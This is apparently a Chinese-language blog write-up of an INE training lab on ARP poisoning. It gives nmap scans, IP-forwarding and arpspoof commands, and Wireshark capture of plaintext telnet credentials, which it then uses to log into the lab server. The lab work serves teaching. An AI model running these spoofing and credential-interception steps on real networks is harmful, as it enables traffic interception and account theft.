---
layout: post
title: "ARP Poisoning Lab"
date: "2022-07-22"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Network Attacks
---

# ARP Poisoning
## 概述
在本实验中，您将连接到交换网络。尝试通过执行 ARP 中毒攻击来拦截网络流量并窃取`telnet`凭据。

## 任务
![arp-poisoning-lab.png](/img/in-post/ine/arp-poisoning-lab.png)

### 实验室环境
在这个实验室环境中，用户将获得对 Kali GUI 实例的访问权限。在同一网络上有一台 telnet 服务器和一台客户端机器，客户端机器每 30 秒向 telnet 服务器进行身份验证。可以使用安装在 Kali 实例上的工具在两台机器上执行攻击。

目的： 识别telnet服务器和客户端机器，通过ARP中毒攻击窃取telnet登录凭据，并登录服务器。

### 指示
* 使用Kali 实例的eth1接口进行攻击并监控流量。
* 不要攻击位于 IP 地址 10.100.13.1 的网关

### 工具
该实验室的最佳工具是：
* arpspoof
* Wireshark

## 我自己的思路
```
└─# ifconfig
adlab0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.3  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:fef9:76b6  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:f9:76:b6  txqueuelen 1000  (Ethernet)
        RX packets 823  bytes 62989 (61.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1775  bytes 1692055 (1.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.100.13.140  netmask 255.255.255.0  broadcast 10.100.13.255
        inet6 fe80::a00:27ff:fed4:ee5d  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:d4:ee:5d  txqueuelen 1000  (Ethernet)
        RX packets 3  bytes 180 (180.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 11  bytes 866 (866.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1790  bytes 23210375 (22.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1790  bytes 23210375 (22.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

检查和eth1同网络的存活主机：

```
nmap -sn 10.100.13.0/24
```

```
└─# nmap -sn 10.100.13.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-22 09:48 EDT
Nmap scan report for 10.100.13.1
Host is up (0.0024s latency).
MAC Address: 0A:00:27:00:00:01 (Unknown)
Nmap scan report for 10.100.13.36
Host is up (0.00073s latency).
MAC Address: 08:00:27:4A:45:F3 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.100.13.37
Host is up (0.0012s latency).
MAC Address: 08:00:27:99:AA:A7 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.100.13.140
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 28.77 seconds
```

探测4个存活主机上的服务和版本：

```
nmap -sV 10.100.13.1,36,37,140
```

```
└─# nmap -sV 10.100.13.1,36,37,140
Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-22 09:55 EDT
Nmap scan report for 10.100.13.1
Host is up (0.00022s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
3389/tcp open  ms-wbt-server xrdp
MAC Address: 0A:00:27:00:00:01 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.100.13.36
Host is up (0.00060s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
23/tcp open  telnet  Linux telnetd
MAC Address: 08:00:27:4A:45:F3 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.100.13.37
Host is up (0.00064s latency).
All 1000 scanned ports on 10.100.13.37 are closed
MAC Address: 08:00:27:99:AA:A7 (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.100.13.140
Host is up (0.0000040s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server xrdp
5910/tcp open  vnc           VNC (protocol 3.8)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 50.08 seconds
```

已知：10.100.13.1是网关，攻击者的kali是10.100.13.140。可以推测出，10.100.13.36是telnet服务器，而10.100.13.37是客户端。

用Wireshark监听eth1，并没有捕获到任何Telnet数据包。

首先，启用Linux Kernel IP Forwarding，这是一项将Linux机器转换为路由器的功能。通过启用IP转发，可以将拦截的数据包转发到真正的目标主机。

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

```
┌──(rootkali)-[~]
└─# cat /proc/sys/net/ipv4/ip_forward
0
                                                                                                                                                                                             
┌──(rootkali)-[~]
└─# echo 1 > /proc/sys/net/ipv4/ip_forward
                                                                                                                                                                                                                                                                                                                                                
┌──(rootkali)-[~]
└─# cat /proc/sys/net/ipv4/ip_forward                                                                                                                                                    1 ⨯
1

```

然后，运行arpspoof：

```
arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36
```

![broadcast-to-telnet-server-client.png](/img/in-post/ine/broadcast-to-telnet-server-client.png)

|Actor|IP|MAC|
|---|---|---|
|Kali|10.100.13.140|08:00:27:d4:ee:5d|
|Telnet Server|10.100.13.36|08:00:27:4a:45:f3|
|Client|10.100.13.37|08:00:27:99:aa:a7|

Kali在得知Telnet Server和Client的MAC地址后，开始进行ARP欺骗。

![arp-spoof.png](/img/in-post/ine/arp-spoof.png)

kali发送未经请求的ARP响应，告诉Telnet Server，10.100.13.37（Client）is at 08:00:27:d4:ee:5d（Kali's Mac）。
Kali发送未经请求的ARP响应，告诉Client，10.100.13.36（Telnet Server）is at 08:00:27:d4:ee:5d（Kali's Mac）。
注意，在Kali发送给Telnet Server的数据包中，Wireshark警告Duplicate IP address detected for 10.100.13.37（Client）(08:00:27:d4:ee:5d)（Kali's MAC）- also in use by 08:00:27:99:aa:a7（Client's MAC）(frame 30)。
意思是客户端的IP地址对应了重复的MAC地址，其中一个是Kali的MAC，另一个是客户端真正的MAC地址。
同理，在Kali发送给Client的数据包中，Wireshark警告Duplicate IP address detected for 10.100.13.36（Telnet Server）(08:00:27:d4:ee:5d)（Kali's MAC）- also in use by 08:00:27:4a:45:f3（Telnet Server's MAC）(frame 31)。
意思是Telent服务器的IP地址对应了重复的MAC地址，其中一个是Kali的MAC，另一个是Telnet服务器真正的MAC地址。

![captured-telnet-packages.png](/img/in-post/ine/captured-telnet-packages.png)

![telnet-credential.png](/img/in-post/ine/telnet-credential.png)

获取到Telnet的凭据：

```
ine login: admin
Password: MyS3cr3tP455
```

按`Ctrl+C`终止arpspoof，清理并重新定位目标...

![ctrlcarpspoof.png](/img/in-post/ine/ctrlcarpspoof.png)

kali告诉client，Telnet Server的正确MAC地址。kali告诉Telnet Server，Client的正确MAC地址。等待工具发送具有正确MAC地址的未经请求的ARP响应。这防止目标将数据包发送到攻击者机器。

![cleaning-up-arp-cache.png](/img/in-post/ine/cleaning-up-arp-cache.png)

```
telnet 10.100.13.36
```

输入凭据即可登录到服务器。